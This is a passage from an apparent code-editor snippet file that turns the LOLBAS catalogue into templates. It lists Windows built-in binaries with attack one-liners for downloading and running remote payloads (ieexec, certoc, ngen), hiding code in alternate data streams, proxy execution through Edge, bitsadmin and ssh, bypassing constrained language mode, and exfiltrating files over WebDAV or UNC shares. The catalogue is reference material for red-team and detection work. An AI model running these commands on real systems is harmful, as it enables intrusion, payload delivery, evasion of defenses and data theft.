            "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Execute, it can be used for Execute binary file specified. Can be used as a defensive evasion.."
    },
    "lolbas Bitsadmin.exe Execute binary file specified. Can be used as a defensive evasion.": {
        "prefix": "lolbas Bitsadmin.exe",
        "body": [
            "Bitsadmin.exe is Used for managing background intelligent transfer. it can One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Execute, it can be used for Execute binary file specified. Can be used as a defensive evasion..",
            "",
            "```sh",
            "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset${0}",
            "```"
        ],
        "description": "Bitsadmin.exe is Used for managing background intelligent transfer. it can One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job., requires  privilege, category: Execute, it can be used for Execute binary file specified. Can be used as a defensive evasion.."
    },
    "Wscript.exe Execute hidden code to evade defensive counter measures (lolbas)": {
        "prefix": "Wscript.exe",
        "body": [
            "Wscript.exe is Used by Windows to execute scripts. it can Download and execute script stored in an alternate data stream, requires  privilege, category: ADS, it can be used for Execute hidden code to evade defensive counter measures.",
            "",
            "```sh",
            "echo GetObject(\"script:{REMOTEURL:.js}\") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js${0}",
            "```"
        ],
        "description": "Wscript.exe is Used by Windows to execute scripts. it can Download and execute script stored in an alternate data stream, requires  privilege, category: ADS, it can be used for Execute hidden code to evade defensive counter measures."
    },
    "lolbas Wscript.exe Execute hidden code to evade defensive counter measures": {
        "prefix": "lolbas Wscript.exe",
        "body": [
            "Wscript.exe is Used by Windows to execute scripts. it can Download and execute script stored in an alternate data stream, requires  privilege, category: ADS, it can be used for Execute hidden code to evade defensive counter measures.",
            "",
            "```sh",
            "echo GetObject(\"script:{REMOTEURL:.js}\") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js${0}",
            "```"
        ],
        "description": "Wscript.exe is Used by Windows to execute scripts. it can Download and execute script stored in an alternate data stream, requires  privilege, category: ADS, it can be used for Execute hidden code to evade defensive counter measures."
    },
    "CertOC.exe Execute code within DLL file (lolbas)": {
        "prefix": "CertOC.exe",
        "body": [
            "CertOC.exe is Used for installing certificates. it can Loads the target DLL file, requires  privilege, category: Execute, it can be used for Execute code within DLL file.",
            "",
            "```sh",
            "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "CertOC.exe is Used for installing certificates. it can Loads the target DLL file, requires  privilege, category: Execute, it can be used for Execute code within DLL file."
    },
    "lolbas CertOC.exe Execute code within DLL file": {
        "prefix": "lolbas CertOC.exe",
        "body": [
            "CertOC.exe is Used for installing certificates. it can Loads the target DLL file, requires  privilege, category: Execute, it can be used for Execute code within DLL file.",
            "",
            "```sh",
            "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "CertOC.exe is Used for installing certificates. it can Loads the target DLL file, requires  privilege, category: Execute, it can be used for Execute code within DLL file."
    },
    "CertOC.exe Download scripts, webshells etc. (lolbas)": {
        "prefix": "CertOC.exe",
        "body": [
            "CertOC.exe is Used for installing certificates. it can Downloads text formatted files, requires  privilege, category: Download, it can be used for Download scripts, webshells etc..",
            "",
            "```sh",
            "certoc.exe -GetCACAPS {REMOTEURL:.ps1}${0}",
            "```"
        ],
        "description": "CertOC.exe is Used for installing certificates. it can Downloads text formatted files, requires  privilege, category: Download, it can be used for Download scripts, webshells etc.."
    },
    "lolbas CertOC.exe Download scripts, webshells etc.": {
        "prefix": "lolbas CertOC.exe",
        "body": [
            "CertOC.exe is Used for installing certificates. it can Downloads text formatted files, requires  privilege, category: Download, it can be used for Download scripts, webshells etc..",
            "",
            "```sh",
            "certoc.exe -GetCACAPS {REMOTEURL:.ps1}${0}",
            "```"
        ],
        "description": "CertOC.exe is Used for installing certificates. it can Downloads text formatted files, requires  privilege, category: Download, it can be used for Download scripts, webshells etc.."
    },
    "ssh.exe Execute specified command, can be used for defense evasion. (lolbas)": {
        "prefix": "ssh.exe",
        "body": [
            "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines., requires  privilege, category: Execute, it can be used for Execute specified command, can be used for defense evasion..",
            "",
            "```sh",
            "ssh localhost \"{CMD}\"${0}",
            "```"
        ],
        "description": "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines., requires  privilege, category: Execute, it can be used for Execute specified command, can be used for defense evasion.."
    },
    "lolbas ssh.exe Execute specified command, can be used for defense evasion.": {
        "prefix": "lolbas ssh.exe",
        "body": [
            "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines., requires  privilege, category: Execute, it can be used for Execute specified command, can be used for defense evasion..",
            "",
            "```sh",
            "ssh localhost \"{CMD}\"${0}",
            "```"
        ],
        "description": "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines., requires  privilege, category: Execute, it can be used for Execute specified command, can be used for defense evasion.."
    },
    "ssh.exe Performs execution of specified file, can be used as a defensive evasion. (lolbas)": {
        "prefix": "ssh.exe",
        "body": [
            "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command from ssh.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion..",
            "",
            "```sh",
            "ssh -o ProxyCommand=\"{CMD}\" .${0}",
            "```"
        ],
        "description": "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command from ssh.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion.."
    },
    "lolbas ssh.exe Performs execution of specified file, can be used as a defensive evasion.": {
        "prefix": "lolbas ssh.exe",
        "body": [
            "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command from ssh.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion..",
            "",
            "```sh",
            "ssh -o ProxyCommand=\"{CMD}\" .${0}",
            "```"
        ],
        "description": "ssh.exe is Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.. it can Executes specified command from ssh.exe, requires  privilege, category: Execute, it can be used for Performs execution of specified file, can be used as a defensive evasion.."
    },
    "Ieexec.exe Download and run attacker code from remote location (lolbas)": {
        "prefix": "Ieexec.exe",
        "body": [
            "Ieexec.exe is The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.. it can Downloads and executes executable from the remote server., requires  privilege, category: Execute, it can be used for Download and run attacker code from remote location.",
            "",
            "```sh",
            "ieexec.exe {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Ieexec.exe is The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.. it can Downloads and executes executable from the remote server., requires  privilege, category: Execute, it can be used for Download and run attacker code from remote location."
    },
    "lolbas Ieexec.exe Download and run attacker code from remote location": {
        "prefix": "lolbas Ieexec.exe",
        "body": [
            "Ieexec.exe is The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.. it can Downloads and executes executable from the remote server., requires  privilege, category: Execute, it can be used for Download and run attacker code from remote location.",
            "",
            "```sh",
            "ieexec.exe {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Ieexec.exe is The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.. it can Downloads and executes executable from the remote server., requires  privilege, category: Execute, it can be used for Download and run attacker code from remote location."
    },
    "Ngen.exe It will download a remote payload and place it in INetCache. (lolbas)": {
        "prefix": "Ngen.exe",
        "body": [
            "Ngen.exe is Microsoft Native Image Generator.. it can Downloads payload from remote server using the Microsoft Native Image Generator utility., requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "ngen.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Ngen.exe is Microsoft Native Image Generator.. it can Downloads payload from remote server using the Microsoft Native Image Generator utility., requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "lolbas Ngen.exe It will download a remote payload and place it in INetCache.": {
        "prefix": "lolbas Ngen.exe",
        "body": [
            "Ngen.exe is Microsoft Native Image Generator.. it can Downloads payload from remote server using the Microsoft Native Image Generator utility., requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache..",
            "",
            "```sh",
            "ngen.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Ngen.exe is Microsoft Native Image Generator.. it can Downloads payload from remote server using the Microsoft Native Image Generator utility., requires  privilege, category: Download, it can be used for It will download a remote payload and place it in INetCache.."
    },
    "Cmd.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism (lolbas)": {
        "prefix": "Cmd.exe",
        "body": [
            "Cmd.exe is The command-line interpreter in Windows. it can Execute payload.bat stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "cmd.exe - < {PATH}:payload.bat${0}",
            "```"
        ],
        "description": "Cmd.exe is The command-line interpreter in Windows. it can Execute payload.bat stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "lolbas Cmd.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism": {
        "prefix": "lolbas Cmd.exe",
        "body": [
            "Cmd.exe is The command-line interpreter in Windows. it can Execute payload.bat stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "cmd.exe - < {PATH}:payload.bat${0}",
            "```"
        ],
        "description": "Cmd.exe is The command-line interpreter in Windows. it can Execute payload.bat stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "Cmd.exe Download/copy a file from a WebDAV server (lolbas)": {
        "prefix": "Cmd.exe",
        "body": [
            "Cmd.exe is The command-line interpreter in Windows. it can Downloads a specified file from a WebDAV server to the target file., requires  privilege, category: Download, it can be used for Download/copy a file from a WebDAV server.",
            "",
            "```sh",
            "type {PATH_SMB} > {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "Cmd.exe is The command-line interpreter in Windows. it can Downloads a specified file from a WebDAV server to the target file., requires  privilege, category: Download, it can be used for Download/copy a file from a WebDAV server."
    },
    "lolbas Cmd.exe Download/copy a file from a WebDAV server": {
        "prefix": "lolbas Cmd.exe",
        "body": [
            "Cmd.exe is The command-line interpreter in Windows. it can Downloads a specified file from a WebDAV server to the target file., requires  privilege, category: Download, it can be used for Download/copy a file from a WebDAV server.",
            "",
            "```sh",
            "type {PATH_SMB} > {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "Cmd.exe is The command-line interpreter in Windows. it can Downloads a specified file from a WebDAV server to the target file., requires  privilege, category: Download, it can be used for Download/copy a file from a WebDAV server."
    },
    "Cmd.exe Upload a file to a WebDAV server (lolbas)": {
        "prefix": "Cmd.exe",
        "body": [
            "Cmd.exe is The command-line interpreter in Windows. it can Uploads a specified file to a WebDAV server., requires  privilege, category: Upload, it can be used for Upload a file to a WebDAV server.",
            "",
            "```sh",
            "type {PATH_ABSOLUTE} > {PATH_SMB}${0}",
            "```"
        ],
        "description": "Cmd.exe is The command-line interpreter in Windows. it can Uploads a specified file to a WebDAV server., requires  privilege, category: Upload, it can be used for Upload a file to a WebDAV server."
    },
    "lolbas Cmd.exe Upload a file to a WebDAV server": {
        "prefix": "lolbas Cmd.exe",
        "body": [
            "Cmd.exe is The command-line interpreter in Windows. it can Uploads a specified file to a WebDAV server., requires  privilege, category: Upload, it can be used for Upload a file to a WebDAV server.",
            "",
            "```sh",
            "type {PATH_ABSOLUTE} > {PATH_SMB}${0}",
            "```"
        ],
        "description": "Cmd.exe is The command-line interpreter in Windows. it can Uploads a specified file to a WebDAV server., requires  privilege, category: Upload, it can be used for Upload a file to a WebDAV server."
    },
    "wbemtest.exe Execute arbitrary commands through WMI classes (lolbas)": {
        "prefix": "wbemtest.exe",
        "body": [
            "wbemtest.exe is WMI/WBEM Test Binary. it can Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources., requires  privilege, category: Execute, it can be used for Execute arbitrary commands through WMI classes.",
            "",
            "```sh",
            "wbemtest.exe${0}",
            "```"
        ],
        "description": "wbemtest.exe is WMI/WBEM Test Binary. it can Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources., requires  privilege, category: Execute, it can be used for Execute arbitrary commands through WMI classes."
    },
    "lolbas wbemtest.exe Execute arbitrary commands through WMI classes": {
        "prefix": "lolbas wbemtest.exe",
        "body": [
            "wbemtest.exe is WMI/WBEM Test Binary. it can Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources., requires  privilege, category: Execute, it can be used for Execute arbitrary commands through WMI classes.",
            "",
            "```sh",
            "wbemtest.exe${0}",
            "```"
        ],
        "description": "wbemtest.exe is WMI/WBEM Test Binary. it can Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources., requires  privilege, category: Execute, it can be used for Execute arbitrary commands through WMI classes."
    },
    "msedgewebview2.exe Proxy execution of binary (lolbas)": {
        "prefix": "msedgewebview2.exe",
        "body": [
            "msedgewebview2.exe is msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.. it can This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=\"{CMD}\"${0}",
            "```"
        ],
        "description": "msedgewebview2.exe is msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.. it can This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "lolbas msedgewebview2.exe Proxy execution of binary": {
        "prefix": "lolbas msedgewebview2.exe",
        "body": [
            "msedgewebview2.exe is msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.. it can This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=\"{CMD}\"${0}",
            "```"
        ],
        "description": "msedgewebview2.exe is msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.. it can This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "Microsoft.Workflow.Compiler.exe Compile and run code (lolbas)": {
        "prefix": "Microsoft.Workflow.Compiler.exe",
        "body": [
            "Microsoft.Workflow.Compiler.exe is A utility included with .NET that is capable of compiling and executing C# or VB.net code.. it can Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file., requires  privilege, category: AWL Bypass, it can be used for Compile and run code.",
            "",
            "```sh",
            "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}${0}",
            "```"
        ],
        "description": "Microsoft.Workflow.Compiler.exe is A utility included with .NET that is capable of compiling and executing C# or VB.net code.. it can Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file., requires  privilege, category: AWL Bypass, it can be used for Compile and run code."
    },
    "lolbas Microsoft.Workflow.Compiler.exe Compile and run code": {
        "prefix": "lolbas Microsoft.Workflow.Compiler.exe",
        "body": [
            "Microsoft.Workflow.Compiler.exe is A utility included with .NET that is capable of compiling and executing C# or VB.net code.. it can Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file., requires  privilege, category: AWL Bypass, it can be used for Compile and run code.",
            "",
            "```sh",
            "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}${0}",
            "```"
        ],
        "description": "Microsoft.Workflow.Compiler.exe is A utility included with .NET that is capable of compiling and executing C# or VB.net code.. it can Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file., requires  privilege, category: AWL Bypass, it can be used for Compile and run code."
    },
    "Msedge.exe Download file from the internet (lolbas)": {
        "prefix": "Msedge.exe",
        "body": [
            "Msedge.exe is Microsoft Edge browser. it can Edge will silently download the file. File extension should be .html and binaries should be encoded., requires  privilege, category: Download, it can be used for Download file from the internet.",
            "",
            "```sh",
            "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}${0}",
            "```"
        ],
        "description": "Msedge.exe is Microsoft Edge browser. it can Edge will silently download the file. File extension should be .html and binaries should be encoded., requires  privilege, category: Download, it can be used for Download file from the internet."
    },
    "lolbas Msedge.exe Download file from the internet": {
        "prefix": "lolbas Msedge.exe",
        "body": [
            "Msedge.exe is Microsoft Edge browser. it can Edge will silently download the file. File extension should be .html and binaries should be encoded., requires  privilege, category: Download, it can be used for Download file from the internet.",
            "",
            "```sh",
            "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}${0}",
            "```"
        ],
        "description": "Msedge.exe is Microsoft Edge browser. it can Edge will silently download the file. File extension should be .html and binaries should be encoded., requires  privilege, category: Download, it can be used for Download file from the internet."
    },
    "Msedge.exe Executes a process under a trusted Microsoft signed binary (lolbas)": {
        "prefix": "Msedge.exe",
        "body": [
            "Msedge.exe is Microsoft Edge browser. it can Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"${0}",
            "```"
        ],
        "description": "Msedge.exe is Microsoft Edge browser. it can Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "lolbas Msedge.exe Executes a process under a trusted Microsoft signed binary": {
        "prefix": "lolbas Msedge.exe",
        "body": [
            "Msedge.exe is Microsoft Edge browser. it can Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"${0}",
            "```"
        ],
        "description": "Msedge.exe is Microsoft Edge browser. it can Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "cmdl32.exe Download file from Internet (lolbas)": {
        "prefix": "cmdl32.exe",
        "body": [
            "cmdl32.exe is Microsoft Connection Manager Auto-Download. it can Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "cmdl32 /vpn /lan %cd%\\config${0}",
            "```"
        ],
        "description": "cmdl32.exe is Microsoft Connection Manager Auto-Download. it can Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas cmdl32.exe Download file from Internet": {
        "prefix": "lolbas cmdl32.exe",
        "body": [
            "cmdl32.exe is Microsoft Connection Manager Auto-Download. it can Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "cmdl32 /vpn /lan %cd%\\config${0}",
            "```"
        ],
        "description": "cmdl32.exe is Microsoft Connection Manager Auto-Download. it can Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "AddinUtil.exe Proxy execution of malicious serialized payload (lolbas)": {
        "prefix": "AddinUtil.exe",
        "body": [
            "AddinUtil.exe is .NET Tool used for updating cache files for Microsoft Office Add-Ins.. it can AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload., requires  privilege, category: Execute, it can be used for Proxy execution of malicious serialized payload.",
            "",
            "```sh",
            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.${0}",
            "```"
        ],
        "description": "AddinUtil.exe is .NET Tool used for updating cache files for Microsoft Office Add-Ins.. it can AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload., requires  privilege, category: Execute, it can be used for Proxy execution of malicious serialized payload."
    },
    "lolbas AddinUtil.exe Proxy execution of malicious serialized payload": {
        "prefix": "lolbas AddinUtil.exe",
        "body": [
            "AddinUtil.exe is .NET Tool used for updating cache files for Microsoft Office Add-Ins.. it can AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload., requires  privilege, category: Execute, it can be used for Proxy execution of malicious serialized payload.",
            "",
            "```sh",
            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.${0}",
            "```"
        ],
        "description": "AddinUtil.exe is .NET Tool used for updating cache files for Microsoft Office Add-Ins.. it can AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload., requires  privilege, category: Execute, it can be used for Proxy execution of malicious serialized payload."
    },
    "Runscripthelper.exe Bypass constrained language mode and execute Powershell script (lolbas)": {
        "prefix": "Runscripthelper.exe",
        "body": [
            "Runscripthelper.exe is Execute target PowerShell script. it can Execute the PowerShell script with .txt extension, requires  privilege, category: Execute, it can be used for Bypass constrained language mode and execute Powershell script.",
            "",
            "```sh",
            "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "Runscripthelper.exe is Execute target PowerShell script. it can Execute the PowerShell script with .txt extension, requires  privilege, category: Execute, it can be used for Bypass constrained language mode and execute Powershell script."
    },
    "lolbas Runscripthelper.exe Bypass constrained language mode and execute Powershell script": {
        "prefix": "lolbas Runscripthelper.exe",
        "body": [
            "Runscripthelper.exe is Execute target PowerShell script. it can Execute the PowerShell script with .txt extension, requires  privilege, category: Execute, it can be used for Bypass constrained language mode and execute Powershell script.",
            "",
            "```sh",
            "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "Runscripthelper.exe is Execute target PowerShell script. it can Execute the PowerShell script with .txt extension, requires  privilege, category: Execute, it can be used for Bypass constrained language mode and execute Powershell script."
    },
    "PrintBrm.exe Exfiltrate the contents of a remote folder on a UNC share into a zip file (lolbas)": {
        "prefix": "PrintBrm.exe",
        "body": [
            "PrintBrm.exe is Printer Migration Command-Line Tool. it can Create a ZIP file from a folder in a remote drive, requires  privilege, category: Download, it can be used for Exfiltrate the contents of a remote folder on a UNC share into a zip file.",
            "",
            "```sh",
            "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}${0}",
            "```"
        ],
        "description": "PrintBrm.exe is Printer Migration Command-Line Tool. it can Create a ZIP file from a folder in a remote drive, requires  privilege, category: Download, it can be used for Exfiltrate the contents of a remote folder on a UNC share into a zip file."
    },
    "lolbas PrintBrm.exe Exfiltrate the contents of a remote folder on a UNC share into a zip file": {
        "prefix": "lolbas PrintBrm.exe",
        "body": [
            "PrintBrm.exe is Printer Migration Command-Line Tool. it can Create a ZIP file from a folder in a remote drive, requires  privilege, category: Download, it can be used for Exfiltrate the contents of a remote folder on a UNC share into a zip file.",
            "",
            "```sh",
            "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}${0}",
            "```"
        ],
        "description": "PrintBrm.exe is Printer Migration Command-Line Tool. it can Create a ZIP file from a folder in a remote drive, requires  privilege, category: Download, it can be used for Exfiltrate the contents of a remote folder on a UNC share into a zip file."
    },
    "PrintBrm.exe Decompress and extract a ZIP file stored on an alternate data stream to a new folder (lolbas)": {
        "prefix": "PrintBrm.exe",
        "body": [
            "PrintBrm.exe is Printer Migration Command-Line Tool. it can Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder, requires  privilege, category: ADS, it can be used for Decompress and extract a ZIP file stored on an alternate data stream to a new folder.",
            "",
            "```sh",
            "PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "PrintBrm.exe is Printer Migration Command-Line Tool. it can Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder, requires  privilege, category: ADS, it can be used for Decompress and extract a ZIP file stored on an alternate data stream to a new folder."
    },
    "lolbas PrintBrm.exe Decompress and extract a ZIP file stored on an alternate data stream to a new folder": {
        "prefix": "lolbas PrintBrm.exe",
        "body": [
            "PrintBrm.exe is Printer Migration Command-Line Tool. it can Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder, requires  privilege, category: ADS, it can be used for Decompress and extract a ZIP file stored on an alternate data stream to a new folder.",
            "",
            "```sh",
            "PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "PrintBrm.exe is Printer Migration Command-Line Tool. it can Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder, requires  privilege, category: ADS, it can be used for Decompress and extract a ZIP file stored on an alternate data stream to a new folder."
    },
    "Makecab.exe Hide data compressed into an alternate data stream (lolbas)": {
        "prefix": "Makecab.exe",
        "body": [
            "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an alternate data stream.",
            "",
            "```sh",
            "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab${0}",
            "```"
        ],
        "description": "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an alternate data stream."
    },
    "lolbas Makecab.exe Hide data compressed into an alternate data stream": {
        "prefix": "lolbas Makecab.exe",
        "body": [
            "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an alternate data stream.",
            "",
            "```sh",
            "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab${0}",
            "```"
        ],
        "description": "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an alternate data stream."
    },
    "Makecab.exe Download file and compress into a cab file (lolbas)": {
        "prefix": "Makecab.exe",
        "body": [
            "Makecab.exe is Binary to package existing files into a cabinet (.cab) file. it can Download and compresses the target file and stores it in the target file., requires  privilege, category: Download, it can be used for Download file and compress into a cab file.",
            "",
            "```sh",
